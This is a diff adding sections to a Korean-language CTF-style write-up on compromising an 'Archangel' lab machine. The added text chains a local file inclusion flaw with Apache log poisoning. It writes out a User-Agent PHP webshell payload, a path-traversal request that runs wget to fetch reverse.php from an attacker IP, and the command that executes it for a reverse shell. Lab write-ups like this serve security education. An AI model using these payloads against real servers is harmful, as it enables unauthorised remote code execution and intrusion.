@@ -14,6 +14,12 @@ sidebar:
 ***
 
 # Archangel 시스템 모의 침투
+## 수행 내용
+1. 정보 수집
+2. 웹 서버 디렉터리중 /test.php 경로 발견
+3. /test.php 에서 LFI 취약점 발견
+4. Apache2 서버 동작중이었으며, LFI 취약점과 연계하여 로그파일 접근
+5. access.log 파일에 Log injection을 통한 PHP 악성(시스템 명령어 실행) 코드 삽입 및 리버스 쉘 실행으로 내부 침투 성공
 ## 정보수집
 ### Nmap 스캔 - 사용중인 포트 및 배너, 기본 정보 수집
 ```
@@ -170,7 +176,33 @@ echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aX
 - 절대경로를 이용하며, ./.././../ 와 같이 필터링을 우회할 수 있음.
 - 현재 타겟 시스템에는 ***<span style="color:red"> LFI 취약점이 존재하며, Apache2 서비스가 동작중이다. </span>*** 
 - apache 로그파일에 접근이 가능하다. 즉 Log Poisoning(log injection) 공격이 가능하다.
+
+## 내부침투
 ### Log Poisoning 취약점 공격
 ![그림1-4](/assets/image/thm_archangel/image4.png)
 - access.log 파일에 성공적으로 접근할 수 있었으며
 - 해당 파일에는 클라이언트의 User-Agent 정보가 기록된다.
+- 이 때 User-Agent 값에 악의적인 코드(PHP 시스템 명령어)를 삽입하게 되면, 서버측에서는 User-Agent 헤더를 해석하며 PHP 소스코드를 만나게되고, 이를 PHP 코드로 인식하여 실행하게 된다.
+![그림 1-5](/assets/image/thm_archangel/image5.png)
+- 간단하게 echo 를 사용하여 정상적으로 실행되는지 확인 한 결과 악의적인 코드삽입으로 인한 String이 로그파일에 출력되는 걸 알 수 있다.
+
+![그림 1-6](/assets/image/thm_archangel/image6.png)
+- Reverse shell 코드가 작성되어 있는 PHP 파일을 생성 후 공격자 PC에서 웹 서버를 구동시켜 User-Agent 헤더를 통해 해당 파일을 가져올 수 있도록 했다.
+
+```
+GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget+http://10.4.47.45/reverse.php 
+```
+![그림 1-7](/assets/image/thm_archangel/image7.png)
+
+- 성공적으로 악성 코드를 받을 수 있었다.
+
+```
+GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=php+reverse.php
+
+'''
+User-Agent: <?php system($_GET['cmd']);?>
+```
+
+![그림 1-8](/assets/image/thm_archangel/image8.png)
+- 성공적으로 웹 서버의 쉘을 획득했다.
+## 시스템 권한 상승
